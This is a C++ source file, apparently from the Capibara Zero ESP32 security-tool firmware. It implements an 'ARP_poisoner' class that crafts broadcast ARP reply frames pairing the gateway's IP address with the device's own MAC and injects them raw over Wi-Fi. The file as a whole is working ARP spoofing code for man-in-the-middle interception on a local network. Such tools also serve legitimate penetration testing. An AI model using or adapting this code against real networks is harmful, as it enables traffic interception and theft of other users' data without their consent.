/*
 * This file is part of the Capibara zero
 * project(https://capibarazero.github.io/).
 *
 * ARP packet structure based on
 * https://github.com/higebu/garp/blob/master/garp.c Copyright (C) 2011-2013
 * P.D. Buchan (pdbuchan@yahoo.com) Copyright (C) 2013       Seungwon Jeong
 * (seungwon0@gmail.com)
 *
 * Copyright (c) 2024 Andrea Canale.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "arp_poisoner.hpp"

#include <WiFi.h>
#include <stdlib.h>
#include <string.h>

#include "esp_private/wifi.h"
#include "esp_wifi.h"

ARP_poisoner::ARP_poisoner(/* args */) {
    // Prepare address ff:ff:ff:ff:ff:ff
    memset(broadcast_mac_address, 0xff, sizeof(broadcast_mac_address));
    // ARP reply will be always send in broadcast
    memcpy(ether_frame, broadcast_mac_address,
           MAC_ADDRESS_LENGTH * sizeof(uint8_t));
    WiFi.macAddress(src_mac);  // Get current MAC address
    // Destination and Source MAC addresses
    memcpy(ether_frame + MAC_ADDRESS_LENGTH, src_mac,
           MAC_ADDRESS_LENGTH * sizeof(uint8_t));

    // Packet type(ARP 0x0806)
    ether_frame[12] = ETHERNET_PROTOCOL_ARP / 256;
    ether_frame[13] = ETHERNET_PROTOCOL_ARP % 256;
}

ARP_poisoner::~ARP_poisoner() { free(src_ip); }

uint8_t *ARP_poisoner::get_current_ip() {
    IPAddress gateway = WiFi.gatewayIP();   // Get gateway IP address
    /* Cast IPAddress to uint8_t array */
    uint8_t *parsed_ip = (uint8_t *)malloc(IPV4_LENGTH * sizeof(uint8_t));
    for (size_t i = 0; i < 4; i++)
    {
        parsed_ip[i] = gateway[i];
    }
    
    // memcpy(parsed_ip, &gateway, IPV4_LENGTH * sizeof(uint8_t));
    return parsed_ip;
}

// Fill ARP packet structure
void ARP_poisoner::fill_arp_hdr(uint8_t *src_mac, uint8_t *src_ip,
                                uint8_t *dest_mac, uint8_t *dest_ip) {
    // Hardware type: 1 for ethernet
    arp_pkt.hw_type = htons(ETH_ARP_HW_TYPE);

    // Protocol type (16 bits): 2048 for IP
    arp_pkt.ptype = htons(ETH_HW_TYPE);  // Ethernet protocol

    // Hardware address length (8 bits): 6 bytes for MAC address
    arp_pkt.hlen = MAC_ADDRESS_LENGTH;

    // Protocol address length (8 bits): 4 bytes for IPv4 address
    arp_pkt.plen = IPV4_LENGTH;

    // OpCode: 2 for ARP reply
    arp_pkt.opcode = htons(ARP_REPLY_OPCODE);

    // Fill IP fields
    memcpy(&arp_pkt.sender_ip, src_ip, IPV4_LENGTH * sizeof(uint8_t));
    memcpy(&arp_pkt.target_ip, dest_ip, IPV4_LENGTH * sizeof(uint8_t));

    // Sender hardware address (48 bits): MAC address
    memcpy(&arp_pkt.sender_mac, src_mac, MAC_ADDRESS_LENGTH * sizeof(uint8_t));
    memcpy(&arp_pkt.target_mac, dest_mac, MAC_ADDRESS_LENGTH * sizeof(uint8_t));
}

void ARP_poisoner::send_arp_packet(uint8_t dest_ip[IPV4_LENGTH],
                                   uint8_t dest_mac[MAC_ADDRESS_LENGTH]) {
    // Fill ARP hdr
    fill_arp_hdr(src_mac, src_ip, dest_mac, dest_ip);

    // Fill payload
    memcpy(ether_frame + ETH_HDRLEN, &arp_pkt, ARP_HDRLEN * sizeof(uint8_t));

    // Send ARP packet
    if (esp_wifi_internal_tx(WIFI_IF_STA, ether_frame, PACKET_LENGTH) !=
        ESP_OK) {
        Serial0.println("Packet not sent");
    } else {
        Serial0.println("Packet sent");
    }
}